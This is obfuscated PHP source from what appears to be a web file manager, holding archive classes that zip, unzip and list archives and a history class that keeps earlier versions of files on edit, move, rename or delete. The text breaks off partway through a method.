<?php
 goto D«²ˆÛªÆ; CÔÏŠ¡¿à¡: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $ı‡¯÷Ú­; if ($ı‡¯÷Ú­) { return $ı‡¯÷Ú­; } $çøŸõ³İ = IO::init($_SERVER[ªÏ§Ë·][8]); return $çøŸõ³İ; } private static function iconvSystem($íÂêÙô) { return self::local()->iconvSystem($íÂêÙô); } private static function iconvApp($²Îãñóø) { return self::local()->iconvApp($²Îãñóø); } public static function zipFolder($ ØÏüõí, $¥í“àÎ = "\172\151\x70", $´©Êİ‰ = '', $„û‡†– = REPEAT_RENAME) { $ò½ş¢öå =& $_SERVER[ªÏ§Ë·]; $¾Ç§“Ïç = IO::listPath($ ØÏüõí); if (!$¾Ç§“Ïç) { return !1; } $¾Ç§“Ïç = array_merge($¾Ç§“Ïç[$ò½ş¢öå[92]], $¾Ç§“Ïç[$ò½ş¢öå[93]]); return self::zip($¾Ç§“Ïç, $¥í“àÎ, $´©Êİ‰, $„û‡†–); } public static function zip($ÊŞõØÚÏ, $¢”Ïó² = "\x7a\x69\160", $ÓÕä„ÙÖ = '', $Ç½ªÆ³² = REPEAT_RENAME) { $ñ’´à¥ =& $_SERVER[ªÏ§Ë·]; if (is_string($ÊŞõØÚÏ) && $ÊŞõØÚÏ) { $ÊŞõØÚÏ = array(array($ñ’´à¥[94] => $ÊŞõØÚÏ)); } $”–§£Íæ = self::init($ÊŞõØÚÏ[0][$ñ’´à¥[94]]); $óÇ’íèØ = self::info($ÊŞõØÚÏ[0][$ñ’´à¥[94]]); $Ä¥¿•Á¡ = $ñ’´à¥[12]; $ŠíôÎéê = $ñ’´à¥[12]; $·Ôà‘ô = $ñ’´à¥[12]; if ($ÓÕä„ÙÖ && substr($ÓÕä„ÙÖ, -1, 1) != $ñ’´à¥[8]) { $ŠíôÎéê = get_path_father($ÓÕä„ÙÖ); $·Ôà‘ô = get_path_this($ÓÕä„ÙÖ); } else { $ŠíôÎéê = self::pathFather($óÇ’íèØ[$ñ’´à¥[94]]); $·Ôà‘ô = $óÇ’íèØ[$ñ’´à¥[42]] . $ñ’´à¥[10] . $¢”Ïó²; if (count($ÊŞõØÚÏ) > 1) { $Ä¡º®æ = IO::info($ŠíôÎéê); $·Ôà‘ô = $Ä¡º®æ[$ñ’´à¥[42]] . $ñ’´à¥[10] . $¢”Ïó²; } if ($ÓÕä„ÙÖ) { $ŠíôÎéê = $ÓÕä„ÙÖ; } } if ($”–§£Íæ->getType() == $ñ’´à¥[116]) { $¦Şñ€ŒÏ = self::init($ŠíôÎéê); $üøÇ»´° = $¦Şñ€ŒÏ->getType() == $ñ’´à¥[116] ? $ŠíôÎéê : get_path_father($”–§£Íæ->path); $üøÇ»´° = rtrim($üøÇ»´°, $ñ’´à¥[8]) . $ñ’´à¥[8]; mk_dir($üøÇ»´°); } else { $Ä¥¿•Á¡ = TEMP_FILES . $ñ’´à¥[1208] . time() . rand_string(8) . $ñ’´à¥[8]; mk_dir($Ä¥¿•Á¡); file_put_contents($Ä¥¿•Á¡ . $ñ’´à¥[1209], $ñ’´à¥[12]); $üøÇ»´° = $Ä¥¿•Á¡; } $ƒ÷Üú¿ = IO::info($üøÇ»´°); if (!$ƒ÷Üú¿ || !$ƒ÷Üú¿[$ñ’´à¥[213]]) { show_json(LNG($ñ’´à¥[1210]), !1); } $ğ¤ùÜ• = self::zipFileList($ÊŞõØÚÏ, $Ä¥¿•Á¡); foreach ($ğ¤ùÜ• as $ôœßğ‘ƒ => $ ¬²ó‹­) { $ğ¤ùÜ•[$ôœßğ‘ƒ] = self::iconvSystem($ ¬²ó‹­); } $‹— ŸÕ = get_filename_auto($üøÇ»´° . $·Ôà‘ô, $ñ’´à¥[12], $Ç½ªÆ³²); KodArchive::create(self::iconvSystem($‹— ŸÕ), $ğ¤ùÜ•); if (!IO::exist($‹— ŸÕ)) { if ($Ä¥¿•Á¡) { del_dir($Ä¥¿•Á¡); } show_json(LNG($ñ’´à¥[1211]), !1); } if (!$Ä¥¿•Á¡) { return $‹— ŸÕ; } $Áöİº‚¯ = self::move($‹— ŸÕ, $ŠíôÎéê, $Ç½ªÆ³²); if ($Ä¥¿•Á¡) { del_dir($Ä¥¿•Á¡); } if (!$‹— ŸÕ) { show_json(LNG($ñ’´à¥[1211]), !1); } return $Áöİº‚¯; } public static function unzip($§’ë†¶ˆ, $øï„­®£, $œÎ×Ç«í = "\55\61", $úÏıØ’È = "\x72\x65\x70\x6c\x61\x63\x65") { $ºßÀõÃ =& $_SERVER[ªÏ§Ë·]; $ìˆìôëÑ = parent::info($§’ë†¶ˆ); if (!$ìˆìôëÑ) { show_json(LNG($ºßÀõÃ[1212]), !1); } $‹’èØà¡ = IO::infoFull($øï„­®£); if (!$‹’èØà¡) { $øï„­®£ = IO::mkdir($øï„­®£); } if (isset($‹’èØà¡[$ºßÀõÃ[440]]) && trim($‹’èØà¡[$ºßÀõÃ[94]], $ºßÀõÃ[8]) != trim($øï„­®£, $ºßÀõÃ[8])) { $Šµı¸‘ = KodIO::make($‹’èØà¡[$ºßÀõÃ[470]]); $áöìÑ§Š = IO::fileNameAuto($Šµı¸‘, $‹’èØà¡[$ºßÀõÃ[42]], REPEAT_RENAME_FOLDER, !0); $øï„­®£ = IO::mkdir($Šµı¸‘ . $áöìÑ§Š); } $œÎ×Ç«í = $œÎ×Ç«í && $œÎ×Ç«í != $ºßÀõÃ[1213] ? @json_decode($œÎ×Ç«í, !0) : -1; $³ÒÎëè° = self::unzipPart($§’ë†¶ˆ, $œÎ×Ç«í); if (!$³ÒÎëè° || !IO::exist($³ÒÎëè°[$ºßÀõÃ[210]])) { show_json(LNG($ºßÀõÃ[115]), !1); } $ÔÊÊ®û = $³ÒÎëè°[$ºßÀõÃ[1214]][count($³ÒÎëè°[$ºßÀõÃ[1214]]) - 1]; if ($ÔÊÊ®û[$ºßÀõÃ[1215]] == -1 || substr($ÔÊÊ®û[$ºßÀõÃ[42]], -1, 1) == $ºßÀõÃ[8]) { $«ªë¼ß¶ = $³ÒÎëè°[$ºßÀõÃ[1216]] . rand_string(10) . $ºßÀõÃ[8]; mk_dir($«ªë¼ß¶); $’¸‡Ÿ˜ = count($³ÒÎëè°[$ºßÀõÃ[1214]]) == 1 ? IO::ext($§’ë†¶ˆ) : get_path_ext($³ÒÎëè°[$ºßÀõÃ[210]]); $¨Ş¨à†… = KodArchive::extract(self::iconvSystem($³ÒÎëè°[$ºßÀõÃ[210]]), $«ªë¼ß¶, $ÔÊÊ®û[$ºßÀõÃ[1215]], $áöìÑ§Š, $’¸‡Ÿ˜); self::unzipErrorCheck($¨Ş¨à†…, array($ºßÀõÃ[1217], $§’ë†¶ˆ, $’¸‡Ÿ˜, $øï„­®£, $³ÒÎëè°)); Hook::trigger($ºßÀõÃ[1218], $«ªë¼ß¶); recursion_dir($«ªë¼ß¶, $¿ØÍîú¬, $º£éíè², 0); $¶ƒØªö = array_merge($¿ØÍîú¬, $º£éíè²); $«îîìƒë = array(); foreach ($¶ƒØªö as $ÜşøÒ´) { $Ü¦‰¡Š = IO::move(self::iconvApp($ÜşøÒ´), $øï„­®£, $úÏıØ’È); if ($Ü¦‰¡Š) { $«îîìƒë[] = $Ü¦‰¡Š; } } del_dir($«ªë¼ß¶); } else { $Ü¦‰¡Š = IO::move($³ÒÎëè°[$ºßÀõÃ[210]], $øï„­®£, $úÏıØ’È, get_path_this($ÔÊÊ®û[$ºßÀõÃ[42]])); if ($Ü¦‰¡Š) { $«îîìƒë[] = $Ü¦‰¡Š; } } return $«îîìƒë ? $«îîìƒë : !1; } public static function unzipList($ƒí”Œó) { $ÄÇÃäÔ =& $_SERVER[ªÏ§Ë·]; $¡ŠÒ«ûı = isset($ƒí”Œó[$ÄÇÃäÔ[1219]]) ? $ƒí”Œó[$ÄÇÃäÔ[1219]] : !1; $¦ˆ®Ñò = isset($ƒí”Œó[$ÄÇÃäÔ[1215]]) ? @json_decode($ƒí”Œó[$ÄÇÃäÔ[1215]], !0) : -1; $–Œœîã = self::unzipPart($ƒí”Œó[$ÄÇÃäÔ[94]], $¦ˆ®Ñò); if (!$–Œœîã || !IO::exist($–Œœîã[$ÄÇÃäÔ[210]])) { show_json(LNG($ÄÇÃäÔ[115]), !1); } $öÙ·ÒÜ‚ = $–Œœîã[$ÄÇÃäÔ[1214]][count($–Œœîã[$ÄÇÃäÔ[1214]]) - 1]; $´Úîàì = in_array(IO::ext($–Œœîã[$ÄÇÃäÔ[210]]), array($ÄÇÃäÔ[351], $ÄÇÃäÔ[1220], $ÄÇÃäÔ[1221], $ÄÇÃäÔ[1222], $ÄÇÃäÔ[1223], $ÄÇÃäÔ[1224])); if (!$¡ŠÒ«ûı && ($öÙ·ÒÜ‚[$ÄÇÃäÔ[1215]] == -1 || $´Úîàì)) { $ÜÅ¸úó  = $–Œœîã[$ÄÇÃäÔ[1216]] . get_path_this($–Œœîã[$ÄÇÃäÔ[210]]) . $ÄÇÃäÔ[1225]; if (!IO::exist($ÜÅ¸úó )) { $é°–ÈñŠ = $öÙ·ÒÜ‚[$ÄÇÃäÔ[1215]] == -1 ? get_path_ext(IO::pathThis($ƒí”Œó[$ÄÇÃäÔ[94]])) : get_path_ext($–Œœîã[$ÄÇÃäÔ[210]]); $”û“‰ô = KodArchive::listContent(self::iconvSystem($–Œœîã[$ÄÇÃäÔ[210]]), !0, $é°–ÈñŠ); self::unzipErrorCheck($”û“‰ô, array($ÄÇÃäÔ[1226], $ƒí”Œó, $–Œœîã)); @file_put_contents($ÜÅ¸úó , json_encode($”û“‰ô[$ÄÇÃäÔ[1227]])); } return @json_decode(IO::getContent($ÜÅ¸úó ), !0); } IO::fileOut($–Œœîã[$ÄÇÃäÔ[210]], $¡ŠÒ«ûı, get_path_this($öÙ·ÒÜ‚[$ÄÇÃäÔ[42]])); die; } private static function zipFileList($–ã·Òã¨, $º¦èÜ› = false) { $“¢«ñ°ò =& $_SERVER[ªÏ§Ë·]; $œ…Î—« = array(); foreach ($–ã·Òã¨ as $»öÌÉÃã) { $ÛŞ•¾ùÍ = $»öÌÉÃã[$“¢«ñ°ò[94]]; if ($º¦èÜ›) { $ÛŞ•¾ùÍ = self::copy($»öÌÉÃã[$“¢«ñ°ò[94]], $º¦èÜ›, $“¢«ñ°ò[846]); } else { $£¬¢Àæ› = self::init($»öÌÉÃã[$“¢«ñ°ò[94]]); if ($£¬¢Àæ›->getType() == $“¢«ñ°ò[116]) { $ÛŞ•¾ùÍ = $£¬¢Àæ›->path; } } if ($ÛŞ•¾ùÍ && self::local()->exist($ÛŞ•¾ùÍ)) { $œ…Î—«[$»öÌÉÃã[$“¢«ñ°ò[94]]] = $ÛŞ•¾ùÍ; } } if (!empty($œ…Î—«)) { return array_values($œ…Î—«); } show_json(LNG($“¢«ñ°ò[1190]), !1); } private static function localFilePath($Ò“ïÃ’ã) { $ÓÂßî =& $_SERVER[ªÏ§Ë·]; $Ö¯ôÃ¤„ = KodIO::parse($Ò“ïÃ’ã); if ($Ö¯ôÃ¤„[$ÓÂßî[43]] == KodIO::KOD_SOURCE) { $£„ñ¾’ = Model($ÓÂßî[853])->fileInfoGet(KodIO::sourceID($Ò“ïÃ’ã)); if (!$£„ñ¾’[$ÓÂßî[94]]) { show_json($ÓÂßî[1228], !1); } $Ò“ïÃ’ã = $£„ñ¾’[$ÓÂßî[94]]; } $ğ‚ŠÛß´ = self::init($Ò“ïÃ’ã); if ($ğ‚ŠÛß´->pathParse[$ÓÂßî[1176]]) { $Ò“ïÃ’ã = $ğ‚ŠÛß´->pathParse[$ÓÂßî[1176]]; $ğ‚ŠÛß´ = self::init($Ò“ïÃ’ã); } $Å…Ü«¿ì = $ğ‚ŠÛß´->getType(); if ($Å…Ü«¿ì == $ÓÂßî[116] || $Å…Ü«¿ì == $ÓÂßî[1229]) { if (!$ğ‚ŠÛß´->exist($ğ‚ŠÛß´->path)) { show_json(LNG($ÓÂßî[115]), !1); } return $ğ‚ŠÛß´->path; } return !1; } public static function unzipPart($¢À¦ß®¼, $ÒºşŒµ¹ = -1) { $š˜Ã˜ =& $_SERVER[ªÏ§Ë·]; $¼´ç¡ò = IO::pathThis($¢À¦ß®¼); if (!$ÒºşŒµ¹ || $ÒºşŒµ¹ == -1) { $³Öç«²¯ = array(array($š˜Ã˜[42] => $¼´ç¡ò, $š˜Ã˜[1215] => -1)); $³Öç«²¯[0][$š˜Ã˜[1230]] = $³Öç«²¯[0][$š˜Ã˜[42]]; } else { if (is_array($ÒºşŒµ¹)) { $³Öç«²¯ = $ÒºşŒµ¹; $•Õâ’å = count($³Öç«²¯) - 1; for ($ÒÚÅ‡ß„ = 0; $ÒÚÅ‡ß„ <= $•Õâ’å; $ÒÚÅ‡ß„++) { $¿¢Î–ªß = $³Öç«²¯[$ÒÚÅ‡ß„]; $Ïï°—Ÿª = get_path_this($¿¢Î–ªß[$š˜Ã˜[42]]) . (checkExtSafe($¿¢Î–ªß[$š˜Ã˜[42]]) ? $š˜Ã˜[12] : $š˜Ã˜[1231]); $³Öç«²¯[$ÒÚÅ‡ß„][$š˜Ã˜[1230]] = $š˜Ã˜[1232] . intval($¿¢Î–ªß[$š˜Ã˜[1215]]) . $š˜Ã˜[424] . $Ïï°—Ÿª; if ($ÒÚÅ‡ß„ == 0) { continue; } $³Öç«²¯[$ÒÚÅ‡ß„][$š˜Ã˜[1230]] = $³Öç«²¯[$ÒÚÅ‡ß„ - 1][$š˜Ã˜[1230]] . $š˜Ã˜[1233] . $³Öç«²¯[$ÒÚÅ‡ß„][$š˜Ã˜[1230]]; } } } if (!is_array($³Öç«²¯) || count($³Öç«²¯) == 0) { return !1; } $ä³²æ¥ì = $³Öç«²¯[count($³Öç«²¯) - 1]; if (!IO::exist($¢À¦ß®¼)) { return !1; } $•¨¶¦è = TEMP_FILES . $š˜Ã˜[1234] . kodIO::hashPathSafe($¢À¦ß®¼) . $š˜Ã˜[8]; $ŠÜ©¢åŞ = $•¨¶¦è . $ä³²æ¥ì[$š˜Ã˜[1230]]; mk_dir($•¨¶¦è); file_put_contents(TEMP_FILES . $š˜Ã˜[1209], $š˜Ã˜[12]); if (IO::exist($ŠÜ©¢åŞ)) { return array($š˜Ã˜[210] => $ŠÜ©¢åŞ, $š˜Ã˜[1214] => $³Öç«²¯, $š˜Ã˜[1216] => $•¨¶¦è); } $•ÆÛçåØ = self::localFilePath($¢À¦ß®¼); if (!$•ÆÛçåØ) { $•ÆÛçåØ = $•¨¶¦è . $š˜Ã˜[1235]; if (!IO::exist($•ÆÛçåØ)) { self::copy($¢À¦ß®¼, $•¨¶¦è, !1, get_path_this($•ÆÛçåØ)); } } if (!$•ÆÛçåØ || !IO::exist($•ÆÛçåØ)) { return !1; } if ($ä³²æ¥ì[$š˜Ã˜[1215]] == -1) { return array($š˜Ã˜[210] => $•ÆÛçåØ, $š˜Ã˜[1214] => $³Öç«²¯, $š˜Ã˜[1216] => $•¨¶¦è); } $í°¸ø ’ = $•ÆÛçåØ; foreach ($³Öç«²¯ as $ÒÚÅ‡ß„ => $¿¢Î–ªß) { if (!$¿¢Î–ªß || $¿¢Î–ªß[$š˜Ã˜[1215]] == $š˜Ã˜[1213]) { break; } if (substr($¿¢Î–ªß[$š˜Ã˜[42]], -1, 1) == $š˜Ã˜[8]) { break; } $óèü‹Ôé = in_array(get_path_ext($¿¢Î–ªß[$š˜Ã˜[1230]]), array($š˜Ã˜[351], $š˜Ã˜[1220], $š˜Ã˜[1221], $š˜Ã˜[1222], $š˜Ã˜[1223], $š˜Ã˜[1224])); $é°“«µ‘ = $ÒÚÅ‡ß„ == count($³Öç«²¯) - 1 && $óèü‹Ôé; $ºä…ì‡ƒ = $•¨¶¦è . $¿¢Î–ªß[$š˜Ã˜[1230]]; $¸¨»«Ùƒ = $•¨¶¦è . get_path_this($¿¢Î–ªß[$š˜Ã˜[42]]); if (IO::exist($ºä…ì‡ƒ)) { $í°¸ø ’ = $ºä…ì‡ƒ; continue; } $Ä€ÆØ‰ö = $ÒÚÅ‡ß„ == 0 ? get_path_ext($¼´ç¡ò) : get_path_ext($í°¸ø ’); $°ã‹ÀÕ = KodArchive::extract(self::iconvSystem($í°¸ø ’), $•¨¶¦è, $¿¢Î–ªß[$š˜Ã˜[1215]], $Ã¥ÖÎåŒ, $Ä€ÆØ‰ö); self::unzipErrorCheck($°ã‹ÀÕ, array($š˜Ã˜[1236], $¢À¦ß®¼, $³Öç«²¯, $¿¢Î–ªß, $ºä…ì‡ƒ)); if (IO::exist($¸¨»«Ùƒ)) { IO::rename($¸¨»«Ùƒ, get_path_this($ºä…ì‡ƒ)); } $í°¸ø ’ = $ºä…ì‡ƒ; } $ŠÜ©¢åŞ = $í°¸ø ’; return array($š˜Ã˜[210] => $í°¸ø ’, $š˜Ã˜[1214] => $³Öç«²¯, $š˜Ã˜[1216] => $•¨¶¦è); } private static function unzipErrorCheck($´ç¥†, $ìÀçÖ—« = false) { $Ú‘¿Ÿ°ã =& $_SERVER[ªÏ§Ë·]; if ($´ç¥†[$Ú‘¿Ÿ°ã[1237]]) { return !0; } write_log(array($Ú‘¿Ÿ°ã[1238], $´ç¥†, $ìÀçÖ—«), $Ú‘¿Ÿ°ã[1239]); show_json($Ú‘¿Ÿ°ã[1240] . json_encode($´ç¥†[$Ú‘¿Ÿ°ã[1227]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ñÈï‹«‚ =& $_SERVER[ªÏ§Ë·]; $ãÉÍùµ = $GLOBALS[$ñÈï‹«‚[6]][$ñÈï‹«‚[99]]; if ($ãÉÍùµ[$ñÈï‹«‚[1241]] != 1) { return; } if ($ãÉÍùµ[$ñÈï‹«‚[1242]] <= 0) { return; } if (isset($_REQUEST[$ñÈï‹«‚[1243]]) && $_REQUEST[$ñÈï‹«‚[1243]] == $ñÈï‹«‚[98]) { return; } Hook::bind($ñÈï‹«‚[1244], $ñÈï‹«‚[1245]); Hook::bind($ñÈï‹«‚[1246], $ñÈï‹«‚[1247]); Hook::bind($ñÈï‹«‚[1248], $ñÈï‹«‚[1249]); Hook::bind($ñÈï‹«‚[1250], $ñÈï‹«‚[1251]); Hook::bind($ñÈï‹«‚[1252], $ñÈï‹«‚[1253]); Hook::bind($ñÈï‹«‚[1254], $ñÈï‹«‚[1255]); } public static function eventBeforeUpload($¯Ú…Ô•ã) { if ($¯Ú…Ô•ã[3] && $¯Ú…Ô•ã[3] != REPEAT_REPLACE) { return; } $Ñ¤³Ì¸” = self::parsePath($¯Ú…Ô•ã[0]); if (!$Ñ¤³Ì¸”) { return; } self::add($Ñ¤³Ì¸”); } public static function eventBeforeEdit($ò¹ªìç¥) { $ÄÎŸİ¼í = self::parsePath($ò¹ªìç¥[0]); if (!$ÄÎŸİ¼í) { return; } self::add($ÄÎŸİ¼í); } public static function eventBeforeCopyFile($»„‚á§ñ, $Š‹…Ã, $ø‚¹ˆ„, $±­®®£Ü, $É×¦é‡•, $¤Ñ¬¼˜) { $çÅ¤ÈÚè =& $_SERVER[ªÏ§Ë·]; if (isset($ø‚¹ˆ„->_data[$çÅ¤ÈÚè[1180]]) && $ø‚¹ˆ„->_data[$çÅ¤ÈÚè[1180]]) { return; } $¥ÔÒúé = $ø‚¹ˆ„->getPathOuter($±­®®£Ü); $ÌÛø¡¼€ = self::parsePath($¥ÔÒúé); if (!$ÌÛø¡¼€) { return; } self::add($ÌÛø¡¼€); } public static function eventBeforeRename($Ìššİ¡Á) { $ã·ğåŸç =& $_SERVER[ªÏ§Ë·]; $¢ï¦ñÎ• = self::parsePath($Ìššİ¡Á[0]); if (!$¢ï¦ñÎ•) { return; } $æ¹ÚåËû = self::checkInHistory($¢ï¦ñÎ•); if (!$æ¹ÚåËû) { return; } if ($æ¹ÚåËû[$ã·ğåŸç[43]] == $ã·ğåŸç[210]) { $ŞµÄÕÅÀ = self::listData($¢ï¦ñÎ•); if ($ŞµÄÕÅÀ && $ŞµÄÕÅÀ[$ã·ğåŸç[407]]) { self::moveHistory($¢ï¦ñÎ•, $Ìššİ¡Á[1]); } } else { IO::rename($æ¹ÚåËû[$ã·ğåŸç[94]], $Ìššİ¡Á[1]); } } public static function eventBeforeMove($ƒ¶½†¸Ô) { $ÆÎ«¶Ş¹ =& $_SERVER[ªÏ§Ë·]; $çÀö´Ó = self::parsePath($ƒ¶½†¸Ô[0]); if (!$çÀö´Ó) { return; } $È¸Å´ûæ = self::parsePath($ƒ¶½†¸Ô[1]); if (!$È¸Å´ûæ) { return; } $ÉÈÕ¨¶ = $ƒ¶½†¸Ô[3]; $ç¬ïêı = self::checkInHistory($çÀö´Ó); if (!$ç¬ïêı) { return; } $ÓÃ²İø = self::pathHistory($È¸Å´ûæ); if ($ç¬ïêı[$ÆÎ«¶Ş¹[43]] == $ÆÎ«¶Ş¹[210]) { $¿¥İèØ† = self::listData($çÀö´Ó); $ŸÛ±Œğ½ = rtrim($È¸Å´ûæ, $ÆÎ«¶Ş¹[8]) . $ÆÎ«¶Ş¹[8] . ($ÉÈÕ¨¶ ? $ÉÈÕ¨¶ : get_path_this($çÀö´Ó)); $¸“ğÂã = self::listData($ŸÛ±Œğ½); if ($¿¥İèØ† && $¿¥İèØ†[$ÆÎ«¶Ş¹[407]] && $¸“ğÂã && $¸“ğÂã[$ÆÎ«¶Ş¹[407]]) { return self::clear($çÀö´Ó); } if ($¿¥İèØ† && $¿¥İèØ†[$ÆÎ«¶Ş¹[407]]) { self::moveHistory($çÀö´Ó, $ÉÈÕ¨¶, $ÓÃ²İø); } } else { IO::move($ç¬ïêı[$ÆÎ«¶Ş¹[94]], $ÓÃ²İø, !1, $ÉÈÕ¨¶); self::clearEmptyFolder(IO::pathFather($ç¬ïêı[$ÆÎ«¶Ş¹[94]])); } } public static function eventAfterRemove($÷úã‘Ò, $áœ÷¬òˆ) { $´µÏÏïê =& $_SERVER[ªÏ§Ë·]; if (!$áœ÷¬òˆ) { return; } $ÉùÊ¹ÀÀ = self::parsePath($÷úã‘Ò[0]); if (!$ÉùÊ¹ÀÀ) { return; } $Œş÷¾®î = self::checkInHistory($ÉùÊ¹ÀÀ); if (!$Œş÷¾®î) { return; } if ($Œş÷¾®î[$´µÏÏïê[43]] == $´µÏÏïê[210]) { $ÀÇ†‡õÓ = self::listData($ÉùÊ¹ÀÀ, !1); if ($ÀÇ†‡õÓ && $ÀÇ†‡õÓ[$´µÏÏïê[407]]) { self::clear($ÉùÊ¹ÀÀ, !1); } } else { IO::remove($Œş÷¾®î[$´µÏÏïê[94]]); self::clearEmptyFolder(IO::pathFather($Œş÷¾®î[$´µÏÏïê[94]])); } } private static function checkInHistory($ßš©†Ò­) { $ô™óË Ù = self::pathHistory($ßš©†Ò­); if (!IO::exist($ô™óË Ù)) { $ô™óË Ù .= $_SERVER[ªÏ§Ë·][1256]; } return IO::exist($ô™óË Ù) ? IO::info($ô™óË Ù) : !1; } private static function parsePath($í¡î¢’²) { $í¿¾íÙî =& $_SERVER[ªÏ§Ë·]; if (!$í¡î¢’²) { return !1; } if ($GLOBALS[$í¿¾íÙî[1257]]) { return; } $ïáñ§‡ = KodIO::parse($í¡î¢’²); $çúÛÃæ¡ = $ïáñ§‡[$í¿¾íÙî[43]]; $À±…â£Å = !$çúÛÃæ¡ || $çúÛÃæ¡ == KodIO::KOD_IO || $çúÛÃæ¡ == KodIO::KOD_SHARE_ITEM; if (!$À±…â£Å || !$ïáñ§‡[$í¿¾íÙî[1258]]) { return !1; } if (substr($í¡î¢’², 0, strlen(DATA_PATH . $í¿¾íÙî[1259])) == DATA_PATH . $í¿¾íÙî[1259]) { return !1; } if ($çúÛÃæ¡ == KodIO::KOD_SHARE_ITEM) { $Ä›úÉ·„ = IO::init($í¡î¢’²); if ($Ä›úÉ·„->pathParse[$í¿¾íÙî[1176]]) { return self::parsePath($Ä›úÉ·„->pathParse[$í¿¾íÙî[1176]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ÈÀˆÓµ• = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $í¿¾íÙî[1260]); foreach ($ÈÀˆÓµ• as $”¸±Â‘Û) { if (!$çúÛÃæ¡ && substr($í¡î¢’², 0, strlen($”¸±Â‘Û)) == $”¸±Â‘Û) { return !1; } } self::log($GLOBALS[$í¿¾íÙî[1171]] . $í¿¾íÙî[1261] . $í¡î¢’²); return $í¡î¢’²; } private static function pathHistory($ß·÷„¿ì) { $ÊÅ•ÒÕœ =& $_SERVER[ªÏ§Ë·]; $‘Ğ©•Ëª = self::$_historyBase . ltrim(KodIO::clear($ß·÷„¿ì), $ÊÅ•ÒÕœ[8]); $‘Ğ©•Ëª = str_replace(array($ÊÅ•ÒÕœ[1262]), array($ÊÅ•ÒÕœ[1263]), $‘Ğ©•Ëª); return $‘Ğ©•Ëª; } public static function log($Á…‰£á›) { } public static function historyCount($°ñıØàÜ) { $×®ªš =& $_SERVER[ªÏ§Ë·]; $ø“ùóı = array(); $ßªÊ¿Â = array(); foreach ($°ñıØàÜ as $†”–š‰) { $€ÏíÊ×ƒ = get_path_father($†”–š‰); if (!$ßªÊ¿Â[$€ÏíÊ×ƒ]) { $ßªÊ¿Â[$€ÏíÊ×ƒ] = array(); } $ßªÊ¿Â[$€ÏíÊ×ƒ][] = get_path_this($†”–š‰); } foreach ($ßªÊ¿Â as $€ÏíÊ×ƒ => $›Æ¾°¾‰) { $ÙÊ © = self::parsePath($€ÏíÊ×ƒ); if (!$ÙÊ ©) { continue; } foreach ($›Æ¾°¾‰ as $Ë¸ã›Ù¡) { $¢‹¤Æ›÷ = self::listData(rtrim($ÙÊ ©, $×®ªš[8]) . $×®ªš[8] . $Ë¸ã›Ù¡, !1); if ($¢‹¤Æ›÷ && $¢‹¤Æ›÷[$×®ªš[407]]) { $ø“ùóı[rtrim($€ÏíÊ×ƒ, $×®ªš[8]) . $×®ªš[8] . $Ë¸ã›Ù¡] = count($¢‹¤Æ›÷[$×®ªš[407]]); } } } return $ø“ùóı; } public static function add($…ÕÕ¸”) { $±Œ˜¹óğ =& $_SERVER[ªÏ§Ë·]; $Û˜üçÄô = self::listData($…ÕÕ¸”); if (!$Û˜üçÄô) { return; } $ôôŸ‹˜ì = Model($±Œ˜¹óğ[798])->get($±Œ˜¹óğ[1264]); $¥„Ì…¤€ = $GLOBALS[$±Œ˜¹óğ[6]][$±Œ˜¹óğ[99]][$±Œ˜¹óğ[1242]]; $Şšã½½ = $ôôŸ‹˜ì == $±Œ˜¹óğ[1265] ? min(5, $¥„Ì…¤€) : $¥„Ì…¤€; if ($¥„Ì…¤€ <= 0) { return; } $¸÷€ÍÁÇ = IO::info($…ÕÕ¸”); $Ñ´¯ÌåÑ = $Û˜üçÄô[$±Œ˜¹óğ[407]]; if ($¸÷€ÍÁÇ[$±Œ˜¹óğ[86]] == 0) { return; } if ($¸÷€ÍÁÇ[$±Œ˜¹óğ[86]] >= 1024 * 1024 * 500) { return !1; } $©²Æ¡É€ = IO::hashSimple($…ÕÕ¸”); if ($Ñ´¯ÌåÑ && $Ñ´¯ÌåÑ[0][$±Œ˜¹óğ[187]] == $©²Æ¡É€) { return !0; } if (array_key_exists($±Œ˜¹óğ[213], $¸÷€ÍÁÇ) && !$¸÷€ÍÁÇ[$±Œ˜¹óğ[213]]) { return !1; } $ì—ƒ’ùÊ = short_id(time()); $óè¶‚­ = array($±Œ˜¹óğ[437] => $ì—ƒ’ùÊ, $±Œ˜¹óğ[187] => $©²Æ¡É€, $±Œ˜¹óğ[42] => $¸÷€ÍÁÇ[$±Œ˜¹óğ[42]] . $±Œ˜¹óğ[10] . date($±Œ˜¹óğ[1266]) . rand_string(1), $±Œ˜¹óğ[86] => $¸÷€ÍÁÇ[$±Œ˜¹óğ[86]], $±Œ˜¹óğ[492] => USER_ID, $±Œ˜¹óğ[211] => time(), $±Œ˜¹óğ[1267] => $±Œ˜¹óğ[12]); IO::mkdir($Û˜üçÄô[$±Œ˜¹óğ[1268]]); $ŞœİŞ±  = IO::copy($…ÕÕ¸”, $Û˜üçÄô[$±Œ˜¹óğ[1268]], !1, $óè¶‚­[$±Œ˜¹óğ[42]]); if (!$ŞœİŞ± ) { self::clearEmptyFolder($Û˜üçÄô[$±Œ˜¹óğ[1268]]); return !1; } array_unshift($Ñ´¯ÌåÑ, $óè¶‚­); if (count($Ñ´¯ÌåÑ) > $Şšã½½) { $¶‹¼»Å— = array_slice($Ñ´¯ÌåÑ, $Şšã½½); foreach ($¶‹¼»Å— as $¤ëşğË) { IO::remove($Û˜üçÄô[$±Œ˜¹óğ[1268]] . $¤ëşğË[$±Œ˜¹óğ[42]]); } $Ñ´¯ÌåÑ = array_slice($Ñ´¯ÌåÑ, 0, $Şšã½½); } return self::saveData($Û˜üçÄô[$±Œ˜¹óğ[1269]], $Ñ´¯ÌåÑ); } public static function remove($™ÌÖ°¯À, $¨İà×ı) { $×éËµˆ =& $_SERVER[ªÏ§Ë·]; $…“ÕËµÛ = self::listData($™ÌÖ°¯À); $çÀœÕÀ = array(); if (!$…“ÕËµÛ) { return !1; } foreach ($…“ÕËµÛ[$×éËµˆ[407]] as $ËØÃ»«) { if ($ËØÃ»«[$×éËµˆ[437]] == $¨İà×ı) { IO::remove($…“ÕËµÛ[$×éËµˆ[1268]] . $ËØÃ»«[$×éËµˆ[42]]); continue; } $çÀœÕÀ[] = $ËØÃ»«; } return self::saveData($…“ÕËµÛ[$×éËµˆ[1269]], $çÀœÕÀ); } public static function clear($œá£Ì«, $œ±Ëş‹ô = true) { $äşÑ·ãº =& $_SERVER[ªÏ§Ë·]; $ÑÛÇæ¼ = self::listData($œá£Ì«, $œ±Ëş‹ô); if 